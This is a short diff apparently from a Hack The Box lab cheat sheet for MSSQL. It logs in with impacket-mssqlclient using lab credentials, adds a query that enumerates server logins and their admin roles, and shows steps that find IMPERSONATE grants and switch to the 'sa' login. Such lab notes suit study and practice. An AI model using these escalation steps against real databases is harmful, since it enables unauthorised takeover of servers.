@@ -464,6 +464,9 @@ impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202
 # help
 help
 
+# user enum
+SELECT r.name, r.type_desc, r.is_disabled, sl.sysadmin, sl.securityadmin, sl.serveradmin, sl.setupadmin, sl.processadmin, sl.diskadmin, sl.dbcreator, sl.bulkadmin FROM master.sys.server_principals r LEFT JOIN master.sys.syslogins sl ON sl.sid = r.sid WHERE r.type IN ('S','E','X','U','G');
+
 # impersonate
 SELECT name FROM sys.server_permissions JOIN sys.server_principals ON grantor_principal_id = principal_id WHERE permission_name = 'IMPERSONATE';
 EXECUTE AS LOGIN = 'sa';
